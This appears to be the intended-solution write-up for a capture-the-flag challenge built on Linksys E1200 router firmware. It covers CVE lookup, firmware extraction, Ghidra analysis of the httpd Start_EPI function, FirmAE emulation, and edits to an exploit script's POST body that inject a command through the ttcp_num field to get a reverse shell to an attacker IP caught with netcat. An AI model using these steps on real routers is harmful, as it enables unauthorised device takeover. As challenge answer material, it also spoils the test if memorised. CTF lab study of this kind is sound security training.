## Intended Solve Path

**QUICK NOTE ON SHELL COMMANDS**
> `$` -> shell console on the attacker machine
> 
> `#` -> console on the router device itself (via firmware emulation)

**STEP 1**

Research on vulnerability (given information of router model: **Linksys E1200**)
- Quick Google search:
```
unauth command injection linksys e1200
```
- Or adding the term **themoon** inside
```
unauth command injection linksys e1200 themoon
```

will yield results for the CVE pages for CVE-2025-60689 and CVE-2025-34037 respectively:
1. https://nvd.nist.gov/vuln/detail/CVE-2025-60689
2. https://nvd.nist.gov/vuln/detail/CVE-2025-34037
    
Scrolling down to the **References to Advisories, Solutions, and Tools** section will show the reference Github pages (1st link):
<img width="1272" height="189" alt="image" src="https://github.com/user-attachments/assets/9c068ad5-0284-4815-a44b-2f515c83a1ef" />
<img width="1272" height="189" alt="image" src="https://github.com/user-attachments/assets/3b5a247a-8c77-402f-8800-749798167e38" />
> Direct link to this repo can also be found under the "hints"

Understand the vulnerability from the CVE/Github reference pages. Key concepts:
1. Function: `Start_EPI` 
2. Binary file: `httpd`

**STEP 2**

Perform firmware extraction to retrieve the filesystem
> follow steps in cheatsheet (`dist/cheatsheet.pdf`) to install dependencies if needed

``` sh
$ binwalk --extract linksys_e1200.bin # eg. extract filesystem from firmware
$ cd linksys_e1200.extracted/squashfs-root
```

- Enumerate the filesystem to find:
1. `httpd` in `/usr/sbin/httpd`
2. `flag.txt` in `/etc/flag.txt`

``` shellsession
# find / -ipath '*httpd' 2>/dev/null
# find / -ipath '*flag.txt' 2>/dev/null
```

**STEP 3**

Open `httpd` in Ghidra, and navigate to the `Start_EPI` function

**Start_EPI**

<img width="597" height="555" alt="image" src="https://github.com/user-attachments/assets/b4e0defe-92c2-40a5-aa85-c1f9bdc74dd5" />
<img width="597" height="246" alt="image" src="https://github.com/user-attachments/assets/4ed3c57d-5a88-4817-940c-2047e88be973" />

**Line 20**
- `DAT__004A9CE8` contains the value "SENT", which is parsed using the `get_cgi` function and passed into `__s1` variable
- the `get_cgi` function parses values from the HTTP POST payload fields
- eg. "SENT=CTF" -> `__s1` = "CTF"

**Line 39**
- `__s1` has to be equals to the value "CTF" to reach lines 41 and 42

**DAT_004A9CE8**
<img width="919" height="269" alt="image" src="https://github.com/user-attachments/assets/3be3ee4e-3f57-4424-a17c-dae80cb15212" />


**FUN__004590cc**

- Called from lines 31, 36, 38 in `Start_EPI`
- Contains a call to `sentctf()` on the last line (modified from a previously vulnerable function call to `wl_exec_cmd`)
<img width="796" height="346" alt="image" src="https://github.com/user-attachments/assets/c9659d26-b1f0-4a20-b667-312118ecc554" />
<img width="796" height="179" alt="image" src="https://github.com/user-attachments/assets/cc09c17d-7ec3-4a5a-a1e2-d131f215f41c" />


**FUN__00458e10**

- Actual intended vulnerable function which calls `system()` on the last line  
<img width="796" height="350" alt="image" src="https://github.com/user-attachments/assets/38c5f116-e7de-4113-be3f-999dc4fff3c0" />


**Additional note on other vulnerabilities (known CVEs on this router)**
- this router contains other known CVEs. Refer to **Other possible exploitation path** below 
> the challenge description specifically states **command injection**, to prevent players from being distracted

**STEP 4**

Perform firmware emulation
- for testing exploit locally, before running on actual device

> refer to `dist/cheatsheet.pdf` to install required dependencies and setup `FirmAE` (emulation tool)
``` sh
$ sudo ./run.sh -d auto linksys_e1200.bin
```
- select option 2 to start a shell console

> the device can now be accessed via a provided local address (eg. `192.168.1.1`)

- perform enumeration
``` sh
# nvram set warning_page_checked=1
# ps w
...
```
- the first `nvram` command is used to disable a certain Linksys configuration

**STEP 5**

Craft an exploit

- tweak the options to the modified `Start_EPI` source code from earlier

**BEFORE modification**
``` python
#### LINE 104 ####
post_data += "ttcp_num=&"
post_data += "ttcp_size=&"
post_data += f"ttcp_ip={payload}&"
```

**AFTER modification**
``` python
#### LINE 104 ####
post_data += "SENT=CTF&" 
post_data += f"ttcp_num={payload}&" # exploitable field
post_data += "ttcp_size=&"
post_data += "ttcp_ip=&"
```

- Intended modifications required:
1. Exploit payload not modified
2. Add additional `SENT` field with value `CTF`
3. Command injection only exploitable via the `ttcp_num` field. The other fields are blocked.

``` sh
$ python3 exploit.py <ATTACKER_IP_TO_RECEIVE_SHELL> 192.168.1.1 80
```
- Given that the following conditions are met:
1. Attacker IP: `192.168.1.1`
2. Vulnerable PORT: `80`
3. HTTP POST body modified accordingly (refer above)

**We will get a remote shell!**

**STEP 6**

Catch a shell and read `flag.txt`
```
$ nc -lvp <PORT>
$ cat /etc/flag.txt
```

## Hints

1. Useful resources: 
https://github.com/Jarrettgohxz/CVE-research/tree/main/Linksys

2. Fun fact: this challenge is named after a botnet

## Other possible solve paths
There exists another stack-based buffer overflow vulnerability on the Linksys E1200 router ([CVE-2025-60690](https://github.com/Jarrettgohxz/CVE-research/tree/main/Linksys/E1200-V2/CVE-2025-60690))

- It is possible to exploit it using the provided exploit script to get a shell -> flag!

## How To Test Locally
> refer to **Intended Solve Path** section for more info

1. Start firmware emulation

``` sh
$ sudo ./run.sh -d auto linksys_e1200.bin
```
2. Set required nvram configurations (from emulation shell console)
```
# nvram set warning_page_checked=1
```

3. Run `solve/exploit.py`

``` sh
$ python3 exploit.py <ATTACKER_IP_TO_RECEIVE_SHELL> 192.168.1.1 80

# cat /etc/flag.txt
```
